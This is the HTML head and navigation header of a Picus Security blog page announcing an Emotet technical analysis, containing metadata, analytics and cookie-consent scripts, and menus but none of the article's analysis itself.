    src: url("/_hcms/googlefonts/Red_Hat_Text/regular.woff2") format("woff2"), url("/_hcms/googlefonts/Red_Hat_Text/regular.woff") format("woff");
  }
</style>

    <script type="application/ld+json">
{
  "mainEntityOfPage" : {
    "@type" : "WebPage",
    "@id" : "https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code"
  },
  "author" : {
    "name" : "Suleyman Ozarslan, PhD",
    "url" : "https://www.picussecurity.com/resource/author/suleyman-ozarslan-phd",
    "@type" : "Person"
  },
  "headline" : "Emotet Technical Analysis - Part 1 Reveal the Evil Code",
  "datePublished" : "2020-01-29T21:00:00.000Z",
  "dateModified" : "2023-03-24T12:53:16.044Z",
  "publisher" : {
    "name" : "Picus Security",
    "logo" : {
      "url" : "https://www.picussecurity.com/hubfs/picus-logo-1.png",
      "@type" : "ImageObject"
    },
    "@type" : "Organization"
  },
  "@context" : "https://schema.org",
  "@type" : "BlogPosting",
  "image" : [ "https://www.picussecurity.com/hubfs/Emotet-social-2.jpg" ]
}
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-migrate/3.3.2/jquery-migrate.min.js"></script>





<script>console.log("I am here!");</script>
<script type="application/ld+json">
    {
"@context": "https://schema.org",
"@type": "BreadcrumbList",
  "itemListElement": [
	{
    "@type": "ListItem",
    "position": 1,
    "name": "Blog",
    "item": "https://www.picussecurity.com/resource/"
  },	
	{
    "@type": "ListItem",
    "position": 2,
    "name": "Emotet Technical Analysis - Part 1 Reveal the Evil Code",
    "item": "https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code"
  }
	]
}
</script>



    
<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-N3KD4ZR');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->



<script>
// Check if the device is a desktop based on screen width
if (window.innerWidth > 1024) { // Adjust the breakpoint as needed
    console.log('Running script for desktop devices.');

    // Dynamically load the Poptin script for desktop devices
    const script = document.createElement('script');
    script.id = 'pixel-script-poptin';
    script.src = 'https://cdn.popt.in/pixel.js?id=64d678615e3d0';
    script.async = true;
    document.head.appendChild(script);

    // Optional: Add a callback for when the script is loaded
    script.onload = () => {
        console.log('Poptin script loaded successfully for desktop.');
    };

    // Optional: Add an error handler
    script.onerror = () => {
        console.error('Failed to load the Poptin script.');
    };
}
</script>




<script>
  // Function to extract first user properties from dataLayer
function getGA4FirstUserProperties() {
  let firstUserProperties = {};

  window.dataLayer.forEach(function(layer) {
    if (layer['event'] === 'gtm.js') {
      firstUserProperties = {
        source: layer['first_user_source'],
        medium: layer['first_user_medium'],
        campaign: layer['first_user_campaign'],
        // Add more fields as needed
      };
    }
  });

  return firstUserProperties;
}

// Example usage
const firstUserProps = getGA4FirstUserProperties();
console.log("firstUserProps : " + firstUserProps);
  </script>

<!-- VisitorQueue Tracking Code for https://www.picussecurity.com/ -->
<link rel="dns-prefetch" href="//t.visitorqueue.com" style="display: none !important;"> <script>function vqTrackId(){return '67ab0ee7-fcba-400b-8cb3-db7bb1cc0033';} (function(d, e) { var el = d.createElement(e); el.sa = function(an, av){this.setAttribute(an, av); return this;}; el.sa('id', 'vq_tracking').sa('src', '//t.visitorqueue.com/p/tracking.min.js?id='+vqTrackId()).sa('async', 1).sa('data-id', vqTrackId()); d.getElementsByTagName(e)[0].parentNode.appendChild(el); })(document, 'script'); </script><link rel="stylesheet" type="text/css" href="https://p.visitorqueue.com/styles/67ab0ee7-fcba-400b-8cb3-db7bb1cc0033.css" id="vq_flick_styles"> <script>function vqTrackPc(){return 1;}</script> <script>(function(d, e) { var el = d.createElement(e); el.sa = function(an, av){this.setAttribute(an, av); return this;}; el.sa('id', 'vq_personalisation').sa('src', '//personalisation.visitorqueue.com/p/personalisation.min.js?id='+vqTrackId()).sa('async', 1).sa('data-id', vqTrackId()); d.getElementsByTagName(e)[0].parentNode.appendChild(el); })(document, 'script'); </script>
<!-- End VisitorQueue -->





<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Corporation",
  "name": "Picus Security",
  "url": "https://www.picussecurity.com/",
  "logo": "https://www.picussecurity.com/hubfs/logo-original.svg",
  "foundingDate": "2013",
  "sameAs": [
    "https://www.linkedin.com/company/picus-security",
    "https://x.com/picussecurity",
    "https://www.youtube.com/channel/UC5mXhfkplWvuVW2Jx9MvOIw"
  ],
  "contactPoint": [
    {
      "@type": "ContactPoint",
      "contactType": "customer service",
      "email": "info@picussecurity.com"
    },
    {
      "@type": "ContactPoint",
      "contactType": "customer service",
      "telephone": "+1 415-890-5105",
      "areaServed": ["US"],
      "availableLanguage": ["English"]
    },
    {
      "@type": "ContactPoint",
      "contactType": "customer service",
      "telephone": "+44 20 38077425",
      "areaServed": ["GB"],
      "availableLanguage": ["English"]
    },
    {
      "@type": "ContactPoint",
      "contactType": "customer service",
      "telephone": "+90 (312) 235 3579",
      "areaServed": ["TR"],
      "availableLanguage": ["Turkish", "English"]
    },
    {
      "@type": "ContactPoint",
      "contactType": "customer service",
      "telephone": "+65 3 1595424",
      "areaServed": ["SG"],
      "availableLanguage": ["English"]
    }
  ],
  "address": [
    {
      "@type": "PostalAddress",
      "streetAddress": "3001 North Rocky Point Drive, East Suite 200",
      "addressLocality": "Tampa",
      "addressRegion": "FL",
      "postalCode": "33607",
      "addressCountry": "US"
    },
    {
      "@type": "PostalAddress",
      "streetAddress": "1401 Pennsylvania Avenue Unit 105 Suite 104",
      "addressLocality": "Wilmington",
      "addressRegion": "DE",
      "postalCode": "19806",
      "addressCountry": "US"
    },
    {
      "@type": "PostalAddress",
      "streetAddress": "Hacettepe Teknokent, Üniversiteler Mah. 1596. Cad. 1. Ar-Ge 97/12 Beytepe, Çankaya",
      "addressLocality": "Ankara",
      "postalCode": "06800",
      "addressCountry": "TR"
    }
  ],
  "founders": [
    {
      "@type": "Person",
      "name": "Hamdi Alper Memiş",
      "jobTitle": "Co-Founder & Chief Executive Officer",
      "sameAs": "https://www.linkedin.com/in/h-alper-memis-cfa-1503a3a/"
    },
    {
      "@type": "Person",
      "name": "Volkan Erturk",
      "jobTitle": "Co-Founder & Chief Technology Officer",
      "sameAs": [
        "https://www.linkedin.com/in/volkanerturk/", 
        "https://x.com/volkanerturk"
      ]
    },
    {
      "@type": "Person",
      "name": "Süleyman Özarslan",
      "jobTitle": "Co-Founder & Vice President of Picus Labs",
      "sameAs": [
        "https://www.linkedin.com/in/ozarslan/",
        "https://x.com/su13ym4n"
      ]
    }
  ],
  "potentialAction": {
    "@type": "SearchAction",
    "target": "https://www.picussecurity.com/hs-search-results?term={search_term_string}",
    "query-input": "required name=search_term_string"
  },
  "funding": [
    {
      "@type": "MonetaryGrant",
      "description": "Series A Investment",
      "funder":
        {
          "@type": "Organization",
          "name": "Bek Ventures",
          "sameAs": [
            "https://www.bekventures.com/",
            "https://www.linkedin.com/company/bekventures"
          ]
        }
    },
    {
      "@type": "MonetaryGrant",
      "description": "Series B Funding",
      "amount": {
        "@type": "MonetaryAmount",
        "currency": "USD",
        "value": "27000000"
      },
      "funder": [
        {
          "@type": "Organization",
          "name": "Turkven",
          "sameAs": [
            "https://turkven.com/",
            "https://www.linkedin.com/company/turkven-private-equity"
          ]
        },
        {
          "@type": "Organization",
          "name": "Bek Ventures",
          "sameAs": [
            "https://www.bekventures.com/",
            "https://www.linkedin.com/company/bekventures"
          ]
        },
        {
          "@type": "Organization",
          "name": "Mastercard",
          "sameAs": [
            "https://www.mastercard.com/",
            "https://www.linkedin.com/company/mastercard"
          ]
        }
      ]
    },
    {
      "@type": "MonetaryGrant",
      "description": "Series C Funding",
      "amount": {
        "@type": "MonetaryAmount",
        "currency": "USD",
        "value": "45000000"
      },
      "funder": [
        {
          "@type": "Organization",
          "name": "Riverwood Capital",
          "sameAs": [
            "https://www.riverwoodcapital.com/",
            "https://www.linkedin.com/company/riverwood-capital"
          ]
        },
        {
          "@type": "Organization",
          "name": "Bek Ventures",
          "sameAs": [
            "https://www.bekventures.com/",
            "https://www.linkedin.com/company/bekventures"
          ]
        }
      ]
    }
  ],
  "owns": {
      "@type": "WebApplication",
      "name": "Picus Security Validation Platform",
      "url": "https://www.picussecurity.com/",
      "applicationCategory": "Cybersecurity",
      "description": "The Picus Security Validation Platform helps organizations assess and improve their security posture with continuous breach and attack simulation.",
      "operatingSystem": "All (Cloud-based Web Application)",
      "browserRequirements": "Requires a modern web browser (Chrome, Firefox, Edge, Safari)",
      "softwareVersion": "Latest",
      "featureList": [
        "Automated Penetration Testing",
        "Continuous Threat Exposure Management",
        "Breach and Attack Simulation",
        "Security Control Validation",
        "Automated Threat Emulation",
        "Security Gap Assessment",
        "Actionable Mitigation Insights",
        "Adversarial Exposure Validation",
        "Attack Surface Validation",
        "Cloud Security Validation",
        "Attack Path Validation",
        "Detection Rule Validation"
      ],
      "offers": {
        "@type": "Offer",
        "priceSpecification": {
          "@type": "PriceSpecification",
          "price": "Contact for pricing",
          "priceCurrency": "USD",
          "valueAddedTaxIncluded": "true"
          },
        "eligibleCustomerType": {
            "@type": "BusinessEntityType",
            "name": "https://www.heppnetz.de/ontologies/goodrelations/v1#Business"
          },
        "seller": {
          "@type": "Corporation",
          "name": "Picus Security",
          "url": "https://www.picussecurity.com/"
        }
      },
      "aggregateRating": {
        "@type": "AggregateRating",
        "ratingValue": "4.8",
        "reviewCount": "139",
        "bestRating": "5",
        "worstRating": "1",
        "ratingExplanation": "Based on customer reviews on Gartner Peer Insights",
        "sameAs": "https://www.gartner.com/reviews/market/breach-and-attack-simulation-bas-tools/vendor/picus-security/product/picus-security-validation-platform"
      },

       "screenshot": [
        "https://discover.picussecurity.com/hubfs/2X-Demand-Gen-Files-2022/Landing%20Page%20-%20Google%20Ads%20Request%20Demo%20Campaign/picus_screenshot_weekly-simulation-dashboard.png",
        "https://discover.picussecurity.com/hubfs/2X-Demand-Gen-Files-2022/Landing%20Page%20-%20Google%20Ads%20Request%20Demo%20Campaign/picus_screenshot-04_integrates-with-latest-tools.png",
        "https://discover.picussecurity.com/hubfs/2X-Demand-Gen-Files-2022/Landing%20Page%20-%20Google%20Ads%20Request%20Demo%20Campaign/picus_screenshot-03_dashboard-performance.png",
        "https://discover.picussecurity.com/hubfs/2X-Demand-Gen-Files-2022/Landing%20Page%20-%20Google%20Ads%20Request%20Demo%20Campaign/picus_screenshot-02_dashboard.png"
      ],
       "applicationSuite": "Picus Security Suite",
       "publisher": {
          "@type": "Corporation",
          "name": "Picus Security",
          "url": "https://www.picussecurity.com/"
        }
  }
}
</script>
<meta property="og:image" content="https://www.picussecurity.com/hubfs/Emotet-social-2.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="600">

<meta name="twitter:image" content="https://www.picussecurity.com/hubfs/Emotet-social-2.jpg">


<meta property="og:url" content="https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code">
<meta name="twitter:card" content="summary_large_image">

<link rel="canonical" href="https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.picussecurity.com/resource/rss.xml">
<meta name="twitter:domain" content="www.picussecurity.com">

<meta http-equiv="content-language" content="en-us">





 
    
	
	
    

	<meta name="generator" content="HubSpot"></head><body class="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N3KD4ZR" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->
<div id="hs_cos_wrapper_module_16122029712703" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"></div>
    <div id="hs_cos_wrapper_module_17321098855501" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">

<script>

  let cookiesToBlockOrUnblock = [];

  // Function to get analytics cookies
  function getAnalyticsCookiesFromHS() {
    return [
      
      "_ga", 
      
      "_ga_DB6MKXQ2E6"
      
    ];
  }

  // Function to get functionality cookies
  function getFunctionalCookiesFromHS() {
    return [
      
      "poptin_last_visit", 
      
      "poptin_old_user", 
      
      "poptin_referrer", 
      
      "poptin_session", 
      
      "poptin_session_account_613f053dd8506", 
      
      "poptin_user_country_code", 
      
      "poptin_user_id", 
      
      "poptin_user_ip", 
      
      "poptin_*"
      
    ];
  }

  // Function to get advertisement cookies
  function getAdvertisementCookiesFromHS() {
    return [
      
    ];
  }

  // Function to get domains
  function getDomainsFromHS() {
    return [
      
      "www.picussecurity.com", 
      
      ".picussecurity.com", 
      
      ".www.picussecurity.com"
      
    ];
  }

  // Example Usage
  console.log("*** Cookie Data From HS ***");
  console.log("Analytics Cookies:", getAnalyticsCookiesFromHS());
  console.log("Functional Cookies:", getFunctionalCookiesFromHS());
  console.log("Advertisement Cookies:", getAdvertisementCookiesFromHS());
  console.log("Domains:", getDomainsFromHS());
  console.log("******");

  function blockOrUnblockCookies(cookiesToBlockOrUnblock) {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');

    Object.defineProperty(document, 'cookie', {
      set: function (value) {
        const cookieName = value.split('=')[0];




        cookiesToBlockOrUnblock.forEach(item => {

          if (item.cookieName.includes(cookieName) && item.isBlocked) {
            console.log(`Cookie Blocked: ${cookieName}`);
            return;
          }
          originalCookieDescriptor.set.call(document, value);


        });




      }
    });

  }




  // Function to check if "Confirm my Choices" was clicked
  function isUserConsentGiven() {
    return localStorage.getItem('userConsentGiven') === 'true';
  }

  function setUserConsentFlag() {
    localStorage.setItem('userConsentGiven', 'true');
    console.log('User consent flag set.');
  }

  function deleteCookie(domains, name) {
    const secureFlags = [true, false];

    domains.forEach(domain => {
      secureFlags.forEach(secure => {
        document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=${domain};${secure ? ' Secure;' : ''}`;
        console.log(`Deleted cookie: ${name} for domain ${domain}`);
      });
    });
  }

  // Function to delete cookies by pattern
  function deleteCookiesByPattern(cookiePatterns) {   
    // Ensure document.cookie is not empty
    if (!document.cookie) {
      console.warn("No cookies available to delete.");
      return;
    }

    const allCookies = document.cookie.split('; ').map(cookie => cookie.split('=')[0].trim());

    cookiePatterns.forEach(pattern => {
      if (pattern.includes('*')) {
        const prefix = pattern.split('*')[0]; // Get the part before the '*'
        allCookies.forEach(cookieName => {
          if (cookieName.startsWith(prefix)) {
            document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
            // console.log(`Deleted cookie matching pattern: ${cookieName}`);
          }
        });
      }
    });
  }

  function getConsentStatusFromPopup() {
    return {
      analytics: $('#hs-category-toggle-analytics').attr('aria-pressed') === 'true',
      functional: $('#hs-category-toggle-functionality').attr('aria-pressed') === 'true',
      advertisement: $('#hs-category-toggle-advertisement').attr('aria-pressed') === 'true'
    };
  }

  function addCookieToArray(cookieName, isBlocked) {
    cookiesToBlockOrUnblock.push({ cookieName: cookieName, isBlocked: isBlocked });
  }

  function addCookieArray(newCookieList, isBlocked) {
    newCookieList.forEach(item => {
      const existingItem = cookiesToBlockOrUnblock.find(existing => existing.cookieName === item);
      if (existingItem) {
        existingItem.isBlocked = isBlocked;
      } else {
        cookiesToBlockOrUnblock.push({ cookieName: item, isBlocked: isBlocked });
      }
    });
  }

  function printCookiesToBlockOrUnblock() {
    cookiesToBlockOrUnblock.forEach(item => {
      console.log(`${item.cookieName}: ${item.isBlocked}`);
    });
  }

  function manageCookies(analytics_thirdpartycookies, functional_thirdpartycookies, advertisement_thirdpartycookies, domains) {
    const consentStatus = getConsentStatusFromPopup();

    console.log ("Consent Statuses: ");
    console.log(consentStatus);

    if (!consentStatus.analytics) {
      localStorage.setItem('analytics_thirdpartycookies', JSON.stringify(analytics_thirdpartycookies));
      addCookieArray(analytics_thirdpartycookies, true);

      analytics_thirdpartycookies.forEach(cookieName => deleteCookie(domains, cookieName));
      deleteCookiesByPattern(analytics_thirdpartycookies); 

    } else {
      addCookieArray(analytics_thirdpartycookies, false);
      localStorage.removeItem('analytics_thirdpartycookies');
    }

    if (!consentStatus.functional) {
      localStorage.setItem('functional_thirdpartycookies', JSON.stringify(functional_thirdpartycookies));
      addCookieArray(functional_thirdpartycookies, true);

      functional_thirdpartycookies.forEach(cookieName => deleteCookie(domains, cookieName));
      deleteCookiesByPattern(functional_thirdpartycookies); 

    } else {
      addCookieArray(functional_thirdpartycookies, false);
      localStorage.removeItem('functional_thirdpartycookies');
    }

    if (!consentStatus.advertisement) {
      localStorage.setItem('advertisement_thirdpartycookies', JSON.stringify(advertisement_thirdpartycookies));
      addCookieArray(advertisement_thirdpartycookies, true);

      advertisement_thirdpartycookies.forEach(cookieName => deleteCookie(domains, cookieName));
      deleteCookiesByPattern(advertisement_thirdpartycookies); 

    } else {
      addCookieArray(advertisement_thirdpartycookies, false);
      localStorage.removeItem('advertisement_thirdpartycookies');
    }

    console.log("*****");
    printCookiesToBlockOrUnblock()
    console.log("*****");
    //blockOrUnblockCookies(cookiesToBlockOrUnblock);
  }

  function attachCookieConsentHandlers() {
    const analyticsCookies = getAnalyticsCookiesFromHS();
    const functionalCookies = getFunctionalCookiesFromHS();
    const advertisementCookies = getAdvertisementCookiesFromHS();
    const domains = getDomainsFromHS();

    const saveSettingsButton = document.getElementById('hs-modal-save-settings');
    const acceptAllButton = document.getElementById('hs-modal-accept-all');

    if (saveSettingsButton) {
      saveSettingsButton.addEventListener('click', function () {
        setUserConsentFlag(); // Set the flag
        manageCookies(analyticsCookies, functionalCookies, advertisementCookies, domains); // Block or unblock cookies
        // console.log('Confirm Choices Button Clicked');
        location.reload();
      });
    } else {
      console.warn("Save Settings button not found!");
    }

    if (acceptAllButton) {
      acceptAllButton.addEventListener('click', function () {
        localStorage.removeItem('analytics_thirdpartycookies');
        localStorage.removeItem('functional_thirdpartycookies');
        localStorage.removeItem('advertisement_thirdpartycookies');
        console.log('All cookies are accepted. No third-party cookies will be deleted.');
        location.reload();
      });
    } else {
      console.warn("Accept All button not found!");
    }
  }

  // Wait for hs-show-banner-button to be clicked and then check for hs-eu-cookie-settings-button
  function waitForBannerAndCookieButton() {
    const observer = new MutationObserver(() => {
      const bannerButton = document.getElementById('hs_show_banner_button');

      if (bannerButton) {
        bannerButton.addEventListener('click', () => {
          // console.log('Banner button clicked, checking for cookie settings button...');

          waitForCookieButton();
        });

        // stop observer
        observer.disconnect();
      }
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }

  // Use an interval to check for the presence of the button
  window.waitForCookieButton = function waitForCookieButton() {
    const maxRetries = 3600; 
    const intervalTime = 1000; 
    let attempts = 0;

    const interval = setInterval(() => {
      const button = document.getElementById('hs-eu-cookie-settings-button');
      if (button) {
        // console.log("Cookie Settings Button Found!");
        clearInterval(interval);

        button.addEventListener('click', function () {
          // console.log("Cookie Settings Button Clicked on popup!");

          attachCookieConsentHandlers();

          console.log('Cookie management script loaded after the "Cookie Settings" button was clicked.');
        });

        return; 
      }

      attempts++;
      if (attempts >= maxRetries) {
        console.warn("Cookie Settings script interval stopping.");
        clearInterval(interval); 
      }
    }, intervalTime);
  };

  function prepareCookiesArrayToBeDeleted(){
    let cookiesToDelete = [];

    const analyticsCookies = JSON.parse(localStorage.getItem('analytics_thirdpartycookies'));
    const functionalCookies = JSON.parse(localStorage.getItem('functional_thirdpartycookies'));
    const advertisementCookies = JSON.parse(localStorage.getItem('advertisement_thirdpartycookies'));

    if (analyticsCookies && Array.isArray(analyticsCookies)) {
      cookiesToDelete = cookiesToDelete.concat(analyticsCookies);
    }

    if (functionalCookies && Array.isArray(functionalCookies)) {
      cookiesToDelete = cookiesToDelete.concat(functionalCookies);
    }

    if (advertisementCookies && Array.isArray(advertisementCookies)) {
      cookiesToDelete = cookiesToDelete.concat(advertisementCookies);
    }
    return cookiesToDelete;
  }

  window.addEventListener('load', function() {
    waitForCookieButton();
    waitForBannerAndCookieButton();

    let attemptCount = 0; 

    const repeatFunction = setInterval(function() {
      attemptCount++;

      if (attemptCount > 7200) {
        clearInterval(repeatFunction);
        console.log('Max attempts reached. No further attempts will be made.');
        return;
      }

      let cookiesToDelete = prepareCookiesArrayToBeDeleted();

      if (isUserConsentGiven()) {
        cookiesToDelete.forEach(cookieName => {
          document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
        });

        deleteCookiesByPattern(cookiesToDelete); // Handle patterns

        console.log('Cookie deletion completed.');
      } else {
        console.log('Cookies are not deleted because user has not given consent yet.');
      }
    }, 500);
  });

</script>

</div>
   
 
	<link rel="stylesheet" href="https://www.picussecurity.com/hs-fs/hubfs/hub_generated/template_assets/1/154512352373/1738152388947/template_s2-generic-2024.min.css">
 
 
 
	<div class="body-wrapper   hs-content-id-35193312585 hs-blog-post hs-blog-id-35190412163  ">
	 
	 
	 <div data-global-resource-path="Shield/templates/partials/header-mega-menu-24.html"><header class="header announce_prev">
 

<section class="announce-bar hidden-sm color-background-gold wf-section" style="">
 <div class="w-container">


  <div class="announce-content-wrapper">
   <div class="announce-content-label">
	<div class="text-weight-medium">
	 
	</div>
   </div>
   <div class="announce-content-detail p1">
	
	
	
	<a href="" target="_blank" rel="nofollow noopener">
	 
	</a>		
	
   </div>
  </div>
  
  
  <div class="announce-content-wrapper slide" style="display:none;">
   <div class="announce-content-label">
	<div class="text-weight-medium">
	 Download Latest Gartner® Report: How to Grow Vulnerability Management Into Exposure Management
	</div>
   </div>
   <div class="announce-content-detail p2">
	
	

	
	<a href="https://www.picussecurity.com/resource/report/gartner-how-to-grow-vulnerability-management-into-exposure-management" target="_blank" rel="nofollow noopener">
	 GET YOUR COPY &gt;&gt;
	</a>		
	
   </div>
  </div>	
  
  <div class="announce-content-wrapper slide" style="display:none;">
   <div class="announce-content-label">
	<div class="text-weight-medium">
	 Download The Red Report 2025!
	</div>
   </div>
   <div class="announce-content-detail p2">
	
	

	
	<a href="https://www.picussecurity.com/resource/report/red-report-2025" target="_blank" rel="noopener">
	 DOWNLOAD NOW &gt;&gt;
	</a>		
	
   </div>
  </div>	
  	
  
 </div>

</section>
<script> 
 document.addEventListener("DOMContentLoaded", function() {
  if (window.innerWidth > 1200) {
   document.body.classList.add("announcement_bar_on");
  }
 });
</script>







 <div class="header__container content-wrapper">

	
	<div class="header__logo header__logo--main">
	 <!-- test3-->
	 <a href="https://www.picussecurity.com" id="hs-link-site_logo_hs_logo_widget" style="border-width:0px;border:0px;">
		
			<img src="https://www.picussecurity.com/hubfs/light_logo-original-SVG.svg" class="hs-image-widget white" style="border-width:0px;border:0px;" width="144" height="24" alt="Picus Security Logo" title="Picus-Security">
	
	 </a>
	</div>
	

	
	<div class="header__column">

	 
	 <div class="header__row-1 custom-menu-primary-mega">		
		<div id="hs_cos_wrapper_module_17113573431413" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">


<div class="custom-menu-top">
 
 <div class="item-list"> 
	<a href="https://discover.picussecurity.com/start-your-free-trial">
	 <div style="display:flex">
		
		Free Trial
	 </div>

	</a>
	<div class="divider">|</div>
 </div>
 
 <div class="item-list"> 
	<a href="https://app.picussecurity.com/signin">
	 <div style="display:flex">
		
		<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_icon" style="" data-hs-cos-general-type="widget" data-hs-cos-type="icon"><svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" aria-hidden="true"><g id="user1_layer"><path d="M423.309 291.025L402.221 285C431.798 243.89 436 202.294 436 180 436 80.649 355.484 0 256 0 156.649 0 76 80.516 76 180c0 22.299 4.198 63.884 33.779 105l-21.088 6.025C21.28 310.285 0 371.59 0 408.605v25.681C0 477.138 34.862 512 77.714 512h356.571C477.138 512 512 477.138 512 434.286v-25.681c0-36.247-20.725-98.161-88.691-117.58zM256 48c72.902 0 132 59.099 132 132s-59.098 132-132 132-132-59.099-132-132S183.098 48 256 48zm208 386.286c0 16.41-13.304 29.714-29.714 29.714H77.714C61.304 464 48 450.696 48 434.286v-25.681c0-33.167 21.987-62.316 53.878-71.427l46.103-13.172C162.683 335.058 200.427 360 256 360s93.317-24.942 108.019-35.994l46.103 13.172C442.013 346.29 464 375.438 464 408.605v25.681z" /></g></svg></span>
		
		Login
	 </div>

	</a>
	
 </div>
 
</div>
<div class="custom-menu-primary-mega header__navigation header--element">
 <div class="mobile-only">
	
	<div class="hs-menu-item hs-menu-depth-1 menu-button"> 
	 <a href="https://discover.picussecurity.com/start-your-free-trial">
		Free Trial
	 </a>
	</div>
	
	<div class="hs-menu-item hs-menu-depth-1 menu-button"> 
	 <a href="https://app.picussecurity.com/signin">
		Login
	 </a>
	</div>
	
 </div>
 

 
 <div class="dropdown">
	  
	<div class="hs-menu-item hs-menu-depth-1 hs-item-has-children bg-color-">
	 
	 <a href="https://www.picussecurity.com/security-validation-platform" class="top-nav platform">Platform</a>
	 
	</div>
	
	<div class="dropdown-content">
	 <div class="page-center">		
		
		<div class="menu-type two-col  second-col-exists">
		 <div class="menu1">
			<span class="h3">Platform</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="https://www.picussecurity.com/security-validation-platform" aria-haspopup="true" aria-expanded="false" role="menuitem" target="_self">Picus Security Validation Platform</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.picussecurity.com/platform/security-control-validation" role="menuitem" target="_self"><i></i>Security Control Validation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.picussecurity.com/platform/attack-surface-validation" role="menuitem" target="_self"><i></i>Attack Surface Validation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.picussecurity.com/platform/cloud-security-validation" role="menuitem" target="_self"><i></i>Cloud Security Validation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.picussecurity.com/platform/attack-path-validation" role="menuitem" target="_self"><i></i>Attack Path Validation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.picussecurity.com/platform/detection-rule-validation" role="menuitem" target="_self"><i></i>Detection Rule Validation</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.picussecurity.com/integrations" role="menuitem" target="_self">Integrations and Supported Technologies</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="menu2">
			<span class="h3">I want to</span>
			<span id="hs_cos_wrapper_module_17113573431413_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_module_17113573431413_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://events.picussecurity.com/demo-picus-platform" role="menuitem" target="_self">Request a Demo</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://discover.picussecurity.com/start-your-free-trial" role="menuitem" target="_self">Start a Trial</a></li>
 </ul>
</div></span>
		 </div>
		 
		 <div class="overview 1">		
			
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://www.picussecurity.com/resource/report/red-report-2025" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
				<img src="https://www.picussecurity.com/hubfs/report%20(1).svg" alt="report">
			 </div>
			 
			 <div class="card-content">
				<span class="title">WHITEPAPER</span>
				<span class="description">Picus Red Report 2025</span>
			 </div>
			</div>
			
			<div class="featured-card">
			 
			 
			 
			 <a href="https://picussecurity.com/hubfs/Datasheet/Picus-Security-Control-Validation-Datasheet.pdf" class="abs-url" target="_blank"></a>
			 
			 
			 <div class="card-visual">
